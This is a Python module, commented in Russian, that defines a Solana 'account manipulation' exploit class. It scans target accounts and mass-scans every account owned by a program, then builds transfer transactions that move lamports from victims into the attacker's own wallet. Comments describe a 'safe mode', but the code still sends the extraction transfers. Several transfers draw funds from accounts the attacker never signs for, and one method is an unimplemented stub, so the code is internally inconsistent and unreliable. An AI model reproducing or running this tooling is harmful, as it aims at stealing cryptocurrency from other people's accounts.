"""
Эксплойты для манипуляций с аккаунтами Solana
"""

import asyncio
import os
from typing import Dict, List, Optional, Any, Union
from dataclasses import dataclass

from solders.pubkey import Pubkey as PublicKey
from solders.keypair import Keypair
from solders.transaction import Transaction
from solders.system_program import CreateAccountParams, create_account, transfer, TransferParams
from solders.instruction import Instruction
from solders.system_program import ID as SYSTEM_PROGRAM_ID

from .base_exploit import BaseExploit, ExploitType, ExploitResult, ExploitStatus
from .safety_checks import ExploitSafetyChecker

@dataclass
class AccountVulnerability:
    """Информация об уязвимости аккаунта"""
    account: str
    vulnerability_type: str
    severity: str
    exploitable: bool
    details: Dict[str, Any]

class AccountExploit(BaseExploit):
    """Эксплойты для манипуляций с аккаунтами"""
    def __init__(self, client, attacker_keypair):
        super().__init__(client, attacker_keypair)
        self.safety_checker = ExploitSafetyChecker(os.getenv("SOLANA_TARGET_ADDRESS"))

    @property
    def exploit_type(self) -> ExploitType:
        return ExploitType.ACCOUNT_MANIPULATION
    
    async def scan_target(self, target: Union[PublicKey, str]) -> Dict[str, Any]:
        """Сканирование аккаунта на уязвимости"""
        try:
            if isinstance(target, str):
                target = PublicKey.from_string(target)
            
            account_info = await self.get_account_info(target)
            if not account_info:
                return {"vulnerable": False, "reason": "Account not found"}
            
            vulnerabilities = []
            
            # Проверка 1: Аккаунт без владельца (System Program)
            if account_info["owner"] == str(SYSTEM_PROGRAM_ID):
                vulnerabilities.append(AccountVulnerability(
                    account=str(target),
                    vulnerability_type="uninitialized_account",
                    severity="high",
                    exploitable=True,
                    details={"lamports": account_info["lamports"]}
                ))
            
            # Проверка 2: Аккаунт с недостаточной арендой
            rent_exempt_minimum = await self._get_rent_exempt_minimum(account_info["data_length"])
            if account_info["lamports"] < rent_exempt_minimum:
                vulnerabilities.append(AccountVulnerability(
                    account=str(target),
                    vulnerability_type="rent_exemption_bypass",
                    severity="medium",
                    exploitable=True,
                    details={
                        "current_lamports": account_info["lamports"],
                        "required_lamports": rent_exempt_minimum,
                        "deficit": rent_exempt_minimum - account_info["lamports"]
                    }
                ))
            
            # Проверка 3: Аккаунт с избыточными lamports
            if account_info["lamports"] > rent_exempt_minimum * 10:
                vulnerabilities.append(AccountVulnerability(
                    account=str(target),
                    vulnerability_type="excess_lamports",
                    severity="low",
                    exploitable=True,
                    details={
                        "excess_lamports": account_info["lamports"] - rent_exempt_minimum
                    }
                ))
            
            # Проверка 4: Исполняемый аккаунт без защиты
            if account_info["executable"] and account_info["data_length"] == 0:
                vulnerabilities.append(AccountVulnerability(
                    account=str(target),
                    vulnerability_type="empty_executable",
                    severity="critical",
                    exploitable=True,
                    details={"executable": True, "data_length": 0}
                ))
            
            return {
                "vulnerable": len(vulnerabilities) > 0,
                "vulnerabilities": vulnerabilities,
                "account_info": account_info
            }
            
        except Exception as e:
            self.logger.error(f"Ошибка сканирования аккаунта {target}: {e}")
            return {"vulnerable": False, "error": str(e)}
    
    async def prepare_exploit(self, target: Union[PublicKey, str], **kwargs) -> bool:
        """Подготовка эксплойта аккаунта"""
        try:
            scan_result = await self.scan_target(target)
            
            if not scan_result.get("vulnerable", False):
                self.logger.warning("Цель не уязвима")
                return False
            
            # Проверяем баланс для выполнения операций
            if not await self.check_sol_balance(0.01):
                return False
            
            self.logger.info(f"Найдено уязвимостей: {len(scan_result['vulnerabilities'])}")
            return True
            
        except Exception as e:
            self.logger.error(f"Ошибка подготовки эксплойта: {e}")
            return False
    
    async def run_exploit(self, target_pubkey: PublicKey) -> ExploitResult:
        self.logger.warning(f"Exploit 'run_exploit' for {self.exploit_type.value} is not implemented.")
        return ExploitResult(
            exploit_type=self.exploit_type,
            status=ExploitStatus.FAILED,
            target_account=str(target_pubkey),
            error_message="Exploit not implemented yet."
        )

    async def execute_exploit(self, target: Union[PublicKey, str], **kwargs) -> ExploitResult:
        """Выполнение эксплойта аккаунта"""
        start_time = asyncio.get_event_loop().time()
        
        try:
            if isinstance(target, str):
                target = PublicKey.from_string(target)
            
            scan_result = await self.scan_target(target)
            vulnerabilities = scan_result.get("vulnerabilities", [])
            
            if not vulnerabilities:
                return ExploitResult(
                    exploit_type=self.exploit_type,
                    status=ExploitStatus.FAILED,
                    target_account=str(target),
                    error_message="No vulnerabilities found"
                )
            
            extracted_value = 0.0
            signatures = []
            
            for vuln in vulnerabilities:
                try:
                    if vuln.vulnerability_type == "uninitialized_account":
                        result = await self._exploit_uninitialized_account(target, vuln)
                        if result:
                            extracted_value += result["value"]
                            signatures.extend(result["signatures"])
                    
                    elif vuln.vulnerability_type == "rent_exemption_bypass":
                        result = await self._exploit_rent_exemption(target, vuln)
                        if result:
                            extracted_value += result["value"]
                            signatures.extend(result["signatures"])
                    
                    elif vuln.vulnerability_type == "excess_lamports":
                        result = await self._exploit_excess_lamports(target, vuln)
                        if result:
                            extracted_value += result["value"]
                            signatures.extend(result["signatures"])
                    
                except Exception as e:
                    self.logger.error(f"Ошибка эксплойта {vuln.vulnerability_type}: {e}")
                    continue
            
            execution_time = asyncio.get_event_loop().time() - start_time
            
            status = ExploitStatus.SUCCESS if extracted_value > 0 else ExploitStatus.FAILED
            
            return ExploitResult(
                exploit_type=self.exploit_type,
                status=status,
                target_account=str(target),
                transaction_signatures=[str(sig) for sig in signatures],
                extracted_value=extracted_value,
                execution_time=execution_time,
                metadata={
                    "vulnerabilities_exploited": len([v for v in vulnerabilities if v.exploitable]),
                    "total_vulnerabilities": len(vulnerabilities)
                }
            )
            
        except Exception as e:
            execution_time = asyncio.get_event_loop().time() - start_time
            
            return ExploitResult(
                exploit_type=self.exploit_type,
                status=ExploitStatus.FAILED,
                target_account=str(target),
                error_message=str(e),
                execution_time=execution_time
            )
    
    async def _exploit_uninitialized_account(self, target: PublicKey, vuln: AccountVulnerability) -> Optional[Dict[str, Any]]:
        """Эксплойт неинициализированного аккаунта"""
        try:
            lamports = vuln.details["lamports"]
            
            if lamports <= 5000:  # Минимальная сумма для перевода
                return None
            
            # Создаем транзакцию для перевода lamports
            transaction = Transaction()
            
            # Инструкция перевода
            transfer_instruction = transfer(
                TransferParams(
                    from_pubkey=target,
                    to_pubkey=self.attacker_pubkey,
                    lamports=lamports - 5000  # Оставляем минимум для аренды
                )
            )
            
            transaction.add(transfer_instruction)
            
            # Отправляем транзакцию
            signature = await self.send_transaction(transaction)
            
            if signature:
                self.logger.info(f"Извлечено {(lamports - 5000) / 1e9:.6f} SOL из неинициализированного аккаунта")
                return {
                    "value": (lamports - 5000) / 1e9,
                    "signatures": [signature]
                }
            
        except Exception as e:
            self.logger.error(f"Ошибка эксплойта неинициализированного аккаунта: {e}")
        
        return None
    
    async def _exploit_rent_exemption(self, target: PublicKey, vuln: AccountVulnerability) -> Optional[Dict[str, Any]]:
        """БЕЗОПАСНЫЙ эксплойт арендной платы - ТОЛЬКО ИЗВЛЕЧЕНИЕ, БЕЗ ОТПРАВКИ СРЕДСТВ"""
        try:
            current_lamports = vuln.details.get("current_lamports", 0)
            
            # 🚨 ПРОВЕРКА БЕЗОПАСНОСТИ: НЕ ОТПРАВЛЯЕМ СРЕДСТВА НА ЦЕЛЕВОЙ АККАУНТ!
            self.logger.warning("🚨 БЕЗОПАСНЫЙ РЕЖИМ: Не отправляем SOL на целевой аккаунт!")
            
            # Проверяем, можем ли мы напрямую извлечь средства из целевого аккаунта
            if current_lamports <= 5000:  # Слишком мало для извлечения
                self.logger.info(f"Целевой аккаунт имеет слишком мало SOL для извлечения: {current_lamports / 1e9:.6f}")
                return None
            
            # Получаем актуальную информацию о балансе целевого аккаунта
            account_info = await self.client.get_account_info(target)
            if not account_info.value:
                self.logger.warning("Целевой аккаунт не существует или недоступен")
                return None
                
            actual_balance = account_info.value.lamports
            if actual_balance <= 5000:
                self.logger.info(f"Актуальный баланс слишком мал: {actual_balance / 1e9:.6f} SOL")
                return None
            
            # Проверяем, имеем ли мы права на перевод с этого аккаунта
            # В реальном эксплойте здесь должна быть логика проверки уязвимости
            self.logger.info(f"Анализируем возможность извлечения {actual_balance / 1e9:.6f} SOL...")
            
            # БЕЗОПАСНАЯ ПОПЫТКА ИЗВЛЕЧЕНИЯ (если аккаунт действительно уязвим)
            # В этой версии мы НЕ ДЕЛАЕМ реальный перевод, только анализ
            
            # 🔒 БЕЗОПАСНАЯ ЛОГИКА: только извлечение, без предварительной отправки
            if self.safety_checker.is_enabled():
                safety_check = self.safety_checker.validate_transfer_direction(
                    from_account=target,
                    to_account=self.our_target_pubkey,
                    transfer_type="lamport_extraction"
                )
                if not safety_check["valid"]:
                    self.logger.warning(f"[SAFETY] Операция заблокирована: {safety_check['message']}")
                    return None
            
            # 🔒 БЕЗОПАСНАЯ ЛОГИКА: только извлечение, без предварительной отправки
            transaction = Transaction()
            
            # Вычисляем сумму для извлечения (оставляем минимум для rent exemption)
            rent_exempt_minimum = await self._get_rent_exempt_minimum(0)
            extraction_amount = actual_balance - rent_exempt_minimum - 5000  # Безопасный буфер
            
            if extraction_amount <= 0:
                self.logger.info("Нет избыточных lamports для безопасного извлечения")
                return None
            
            # 💸 ЕДИНСТВЕННАЯ операция: извлечение ИЗ target В наш кошелек
            extract_ix = transfer(
                TransferParams(
                    from_pubkey=target,  # ИЗ целевого аккаунта
                    to_pubkey=self.our_target_pubkey,  # В НАШ кошелек (SOLANA_TARGET_ADDRESS)
                    lamports=extraction_amount
                )
            )
            
            transaction.add(extract_ix)
            
            # Проверяем, что у целевого аккаунта есть необходимые права
            # Это может работать только если аккаунт имеет специфические условия
            # (например, PDA с известными seeds или уязвимая программа-владелец)
            
            self.logger.info(f"Попытка извлечь {extraction_amount/1e9:.6f} SOL из {target}")
            
            # Отправляем транзакцию
            signature = await self.send_transaction(transaction)
            
            if signature:
                extracted_value = extraction_amount / 1e9
                self.logger.info(f"✅ Успешно извлечено {extracted_value:.6f} SOL")
                return {
                    "value": extracted_value,
                    "signatures": [signature],
                    "method": "direct_extraction"
                }
            else:
                self.logger.warning("Не удалось извлечь избыточные lamports - нет прав доступа")
            
        except Exception as e:
            self.logger.error(f"Ошибка эксплойта арендной платы: {e}")
        
        return None

    async def _exploit_excess_lamports(self, target: PublicKey, vuln: AccountVulnerability) -> Optional[Dict[str, Any]]:
        """Эксплойт избыточных lamports - БЕЗОПАСНАЯ версия"""
        try:
            # ✅ КРИТИЧЕСКАЯ ПРОВЕРКА: извлекаем ТОЛЬКО из target в наш кошелек
            if self.safety_checker.is_enabled():
                safety_check = self.safety_checker.validate_transfer_direction(
                    from_account=target,  # ИЗ целевого аккаунта
                    to_account=self.our_target_pubkey,  # В НАШ кошелек
                    transfer_type="lamport_extraction"
                )
                if not safety_check["valid"]:
                    self.logger.warning(f"[SAFETY] Операция заблокирована: {safety_check['message']}")
                    return None
            
            excess_lamports = vuln.details["excess_lamports"]
            
            # Минимальный порог для эксплойта (0.01 SOL)
            if excess_lamports < 10_000_000:  # 0.01 SOL
                self.logger.info(f"Недостаточно избыточных lamports: {excess_lamports/1e9:.6f} SOL")
                return None
            
            # 🔒 БЕЗОПАСНАЯ ЛОГИКА: только извлечение, без предварительной отправки
            transaction = Transaction()
            
            # Вычисляем сумму для извлечения (оставляем минимум для rent exemption)
            rent_exempt_minimum = await self._get_rent_exempt_minimum(0)
            extraction_amount = excess_lamports - rent_exempt_minimum - 5000  # Безопасный буфер
            
            if extraction_amount <= 0:
                self.logger.info("Нет избыточных lamports для безопасного извлечения")
                return None
            
            # 💸 ЕДИНСТВЕННАЯ операция: извлечение ИЗ target В наш кошелек
            extract_ix = transfer(
                TransferParams(
                    from_pubkey=target,  # ИЗ целевого аккаунта
                    to_pubkey=self.our_target_pubkey,  # В НАШ кошелек (SOLANA_TARGET_ADDRESS)
                    lamports=extraction_amount
                )
            )
            
            transaction.add(extract_ix)
            
            # Проверяем, что у целевого аккаунта есть необходимые права
            # Это может работать только если аккаунт имеет специфические условия
            # (например, PDA с известными seeds или уязвимая программа-владелец)
            
            self.logger.info(f"Попытка извлечь {extraction_amount/1e9:.6f} SOL из {target}")
            
            # Отправляем транзакцию
            signature = await self.send_transaction(transaction)
            
            if signature:
                extracted_value = extraction_amount / 1e9
                self.logger.info(f"✅ Успешно извлечено {extracted_value:.6f} SOL")
                return {
                    "value": extracted_value,
                    "signatures": [signature],
                    "method": "direct_extraction"
                }
            else:
                self.logger.warning("Не удалось извлечь избыточные lamports - нет прав доступа")
            
        except Exception as e:
            self.logger.error(f"Ошибка эксплойта избыточных lamports: {e}")
        
        return None

# ...
    async def _get_rent_exempt_minimum(self, data_length: int) -> int:
        """Получение минимальной суммы для освобождения от аренды"""
        try:
            response = await self.client.get_minimum_balance_for_rent_exemption(data_length)
            return response.value
        except Exception as e:
            self.logger.error(f"Ошибка получения минимального баланса: {e}")
            return 890880  # Стандартное значение для пустого аккаунта
    
    async def scan_multiple_accounts(self, accounts: List[Union[PublicKey, str]]) -> List[Dict[str, Any]]:
        """Массовое сканирование аккаунтов"""
        results = []
        
        for account in accounts:
            try:
                result = await self.scan_target(account)
                result["account"] = str(account)
                results.append(result)
                
                # Небольшая задержка между запросами
                await asyncio.sleep(0.1)
                
            except Exception as e:
                self.logger.error(f"Ошибка сканирования аккаунта {account}: {e}")
                results.append({
                    "account": str(account),
                    "vulnerable": False,
                    "error": str(e)
                })
        
        return results
    
    async def find_vulnerable_accounts_by_program(self, program_id: Union[PublicKey, str], 
                                                limit: int = 100) -> List[str]:
        """Поиск уязвимых аккаунтов по программе"""
        try:
            if isinstance(program_id, str):
                program_id = PublicKey(program_id)
            
            # Получаем аккаунты программы
            response = await self.client.get_program_accounts(program_id)
            
            vulnerable_accounts = []
            
            for account_info in response.value[:limit]:
                account_pubkey = account_info.pubkey
                
                # Сканируем каждый аккаунт
                scan_result = await self.scan_target(account_pubkey)
                
                if scan_result.get("vulnerable", False):
                    vulnerable_accounts.append(str(account_pubkey))
                
                # Задержка между сканированиями
                await asyncio.sleep(0.1)
            
            self.logger.info(f"Найдено {len(vulnerable_accounts)} уязвимых аккаунтов для программы {program_id}")
            return vulnerable_accounts
            
        except Exception as e:
            self.logger.error(f"Ошибка поиска уязвимых аккаунтов: {e}")
            return []
